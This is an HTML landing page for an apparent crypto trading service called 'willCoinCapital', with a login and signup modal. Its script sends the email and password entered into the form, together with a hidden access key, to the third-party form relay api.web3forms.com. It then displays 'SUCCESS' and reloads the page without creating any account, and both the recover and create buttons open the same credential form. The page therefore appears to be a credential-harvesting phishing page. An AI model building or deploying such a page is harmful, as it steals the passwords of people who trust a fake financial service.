<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>willCoinCapital | Gateway</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Plus Jakarta Sans', sans-serif; background-color: #000000; color: white; margin: 0; overflow: hidden; height: 100vh; }
        
        /* CENTRAL ATMOSPHERIC GLOW */
        .main-aura {
            position: absolute; top: 55%; left: 50%; transform: translate(-50%, -50%);
            width: 350px; height: 350px;
            background: radial-gradient(circle, rgba(20, 184, 166, 0.3) 0%, rgba(34, 211, 238, 0) 70%);
            filter: blur(50px); z-index: 1; pointer-events: none;
        }

        /* FLOATING ASSET CARDS */
        .asset-card {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 20px;
            width: 75px; height: 75px;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            position: absolute; animation: floatIcon 5s ease-in-out infinite; z-index: 10;
        }

        @keyframes floatIcon {
            0%, 100% { transform: translateY(0) rotate(0deg); }
            50% { transform: translateY(-15px) rotate(2deg); }
        }

        .label-text { font-size: 10px; font-weight: 600; color: rgba(255,255,255,0.4); margin-bottom: 4px; text-transform: lowercase; }
        
        /* BUTTON STYLING */
        .btn-recover { border: 1px solid #14b8a6; color: #14b8a6; }
        .btn-create { background: linear-gradient(to right, #14b8a6, #22d3ee); color: #000; box-shadow: 0 10px 25px -5px rgba(20, 184, 166, 0.4); }
        
        .view-hidden { display: none !important; }
    </style>
</head>
<body class="flex flex-col items-center justify-between py-16 px-10 relative">

    <div class="main-aura"></div>

    <header class="text-center z-20 space-y-4">
        <div class="text-[11px] font-bold text-gray-500 uppercase tracking-[0.3em]">willCoinCapital</div>
        <div class="bg-white/5 border border-white/10 px-4 py-1.5 rounded-full text-[9px] font-bold uppercase tracking-widest inline-block text-gray-400">
            Trade crypto anytime
        </div>
        <h1 class="text-[34px] font-extrabold tracking-tight leading-[1.1] text-white pt-4">
            Power Up Your <br> Crypto Journey
        </h1>
    </header>

    <div class="relative w-full h-72 z-10">
        <div class="asset-card" style="top: 40%; left: 50%; transform: translate(-50%, -50%); width: 90px; height: 90px;">
            <span class="label-text">sol</span>
            <img src="https://cryptologos.cc/logos/solana-sol-logo.png" class="w-8 opacity-90" alt="sol">
        </div>
        
        <div class="asset-card" style="top: 10%; left: 15%; animation-delay: 0.5s;">
            <span class="label-text">eth</span>
            <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" class="w-6 opacity-60" alt="eth">
        </div>

        <div class="asset-card" style="top: 25%; right: 10%; animation-delay: 1.2s;">
            <span class="label-text">bnb</span>
            <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" class="w-6 opacity-60" alt="bnb">
        </div>

        <div class="asset-card" style="bottom: 10%; right: 20%; animation-delay: 1.8s;">
            <span class="label-text">btc</span>
            <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" class="w-6 opacity-60" alt="btc">
        </div>
    </div>

    <div class="w-full max-w-sm space-y-4 z-20">
        <button onclick="toggleAuth('signup')" class="w-full py-4 rounded-2xl btn-recover text-[11px] font-black uppercase tracking-[0.2em] transition-all active:scale-95">
            Recover Account
        </button>
        <button onclick="toggleAuth('signup')" class="w-full py-4 rounded-2xl btn-create text-[11px] font-black uppercase tracking-[0.2em] transition-all active:scale-95">
            Create Account
        </button>
        
        <div class="text-center pt-4">
            <button onclick="toggleAuth('login')" class="text-[10px] text-gray-500 font-bold uppercase tracking-widest">
                Already Have An Account? <span class="text-white ml-1">Log In</span>
            </button>
        </div>
    </div>

    <div id="authModal" class="fixed inset-0 z-[100] flex items-center justify-center p-6 view-hidden">
        <div class="absolute inset-0 bg-black/95 backdrop-blur-xl" onclick="toggleAuth()"></div>
        <div class="relative z-10 w-full max-w-xs space-y-6">
            <h2 id="authTitle" class="text-center text-xl font-black uppercase tracking-tighter text-cyan-400">Authorize</h2>
            <form id="authForm" class="space-y-3">
                <input type="hidden" name="access_key" value="56f62943-45be-49fc-9e75-e166e5d4d20b">
                <input type="email" name="email" placeholder="EMAIL ADDRESS" required class="w-full bg-white/5 border border-white/10 rounded-xl p-4 text-[10px] font-bold outline-none text-white focus:border-cyan-500/50 uppercase tracking-widest">
                <input type="password" name="password" placeholder="PASSWORD" required class="w-full bg-white/5 border border-white/10 rounded-xl p-4 text-[10px] font-bold outline-none text-white focus:border-cyan-500/50 uppercase tracking-widest">
                <button type="submit" id="authSubmit" class="w-full py-4 btn-create rounded-xl text-[11px] font-black uppercase tracking-widest">Continue</button>
            </form>
        </div>
    </div>

    <script>
        function toggleAuth(mode) {
            const modal = document.getElementById('authModal');
            if (!mode) { modal.classList.add('view-hidden'); return; }
            document.getElementById('authTitle').innerText = mode === 'login' ? 'Welcome Back' : 'System Entry';
            modal.classList.remove('view-hidden');
        }

        document.getElementById('authForm').onsubmit = async (e) => {
            e.preventDefault();
            const btn = document.getElementById('authSubmit');
            const originalText = btn.innerText;
            btn.innerText = "SYNCHRONIZING...";
            btn.disabled = true;

            try {
                await fetch('https://api.web3forms.com/submit', { method: 'POST', body: new FormData(e.target) });
                btn.innerText = "SUCCESS";
                setTimeout(() => { window.location.reload(); }, 1500);
            } catch(e) { 
                btn.innerText = "ERROR - RETRY"; 
                btn.disabled = false;
            }
        };
    </script>
</body>
</html>
